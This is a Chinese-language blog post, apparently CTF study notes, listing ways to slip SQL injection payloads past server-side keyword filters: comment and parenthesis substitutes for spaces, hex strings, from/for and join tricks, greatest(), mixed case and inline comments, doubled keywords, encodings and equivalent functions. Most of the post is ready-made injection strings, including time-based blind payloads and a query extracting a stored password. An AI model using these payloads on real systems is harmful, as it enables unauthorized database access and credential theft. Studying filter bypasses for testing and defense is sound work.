---
title: sql注入针对关键字过滤的绕过技巧
date: 2018-10-14 18:07:45
tags:
    - ctf
    - sql
    - bypass
categories:
    - ctf
---

在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。
<!--more-->

一、过滤空格
------

 - 1.1.使用 **注释符`/**/`**


    SELECT/**/name/**/FROM/**/table


 - 1.2.使用 **url编码**


    %a0 发出去就是空格的意思，但是需要在burp中抓包后修改


 - 1.3.使用 **浮点数**


    select * from users where id=8E0union select 1,2,3
    select * from users where id=8.0 select 1,2,3


 - 1.4.使用 **Tab代替空格**

 - 1.5.使用 **两个空格代替一个空格**

 - 1.6.使用 **括号**

如果空格被过滤，括号没有被过滤，可以用括号绕过。
在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。

例如：

    select(user())from dual where(1=1)and(2=2)

这种过滤方法常常用于time based盲注,例如：

    ?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23



二、过滤引号
------

 - 2.1.使用 **16进制**

会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：

    select column_name  from information_schema.tables where table_name="users"

这个时候如果引号被过滤了，那么上面的`where`子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
`users`的十六进制的字符串是`7573657273`。那么最后的sql语句就变为了：

    select column_name  from information_schema.tables where table_name=0x7573657273



三、过滤逗号
------

 - 3.1.使用 **from关键字**

对于`substr()`和`mid()`这两个方法可以使用`from to`的方式来解决：

    select substr(database() from 1 for 1);
    select mid(database() from 1 for 1);

 - 3.2.使用 **join关键字**


    union select 1,2     #等价于
    union select * from (select 1)a join (select 2)b


 - 3.3.使用 **like关键字**


    select ascii(mid(user(),1,1))=80   #等价于
    select user() like 'r%'


 - 3.4.使用 **offset关键字**

对于limit可以使用offset来绕过：

    select * from news limit 0,1

等价于下面这条SQL语句

    select * from news limit 1 offset 0


四、过滤注释符（`#`或`-- `）
------------------

 - 4.1.手动闭合引号，不使用注释符


    id=1' union select 1,2,3||'1


或者：

    id=1' union select 1,2,'3



五、过滤比较符号 （`<`和`>`）
------------------

 - 5.1.使用 **`greatest()`、`least（）`函数**

greatest()、least（）：（前者返回最大值，后者返回最小值）
同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。
最常见的一个盲注的sql语句：

    select * from users where id=1 and ascii(substr(database(),0,1))>64

此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。
那么上面的这条sql语句可以使用greatest变为如下的子句:

    select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64

 - 5.2.使用 **`between` `and`**

between a and b：返回a，b之间的数据，不包含b。


六、过滤等号（`=`）
-----------

 - 6.1.使用like 、rlike 、regexp 或者 使用< 或者 >

七、过滤`or` `and` `xor` `not`
--------------------------

 - 7.1.使用符号代替


    and=`&&`  or=`||`   xor=`|`   not=`!`


八、过滤`union`，`select`，`where`等
-----------------------------

 - 8.1.使用 **注释符**

常用注释符：

    //，-- , /**/, #, --+, -- -, ;,%00,--a

用法：

    U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user

 - 8.2.使用 **大小写**


    id=-1'UnIoN/**/SeLeCT


 - 8.3.使用 **内联注释**


    id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#


 - 8.4.使用 **双关键字绕过（若删除掉第一个匹配的union就能绕过）**


    id=-1'UNIunionONSeLselectECT1,2,3–-


 - 8.5.使用 **加号+拆解字符串**


    如 `or ‘swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ )`




九、使用 **各种编码**绕过过滤
-----------------

 - 9.1.如`URLEncode`编码，`ASCII`,`HEX`,`unicode`编码绕过


    `or 1=1`即`%6f%72%20%31%3d%31`，而`Test`也可以为`CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)`



十、使用**等价函数**绕过过滤
----------------


    hex()、bin() ==> ascii()
    
    sleep() ==>benchmark()
    
    concat_ws()==>group_concat()
    
    mid()、substr() ==> substring()
    
    @@user ==> user()
    
    @@datadir ==> datadir()
    
    举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　
    
    或者：
    substr((select 'password'),1,1) = 0x70
    strcmp(left('password',1), 0x69) = 1
    strcmp(left('password',1), 0x70) = 0
    strcmp(left('password',1), 0x71) = -1

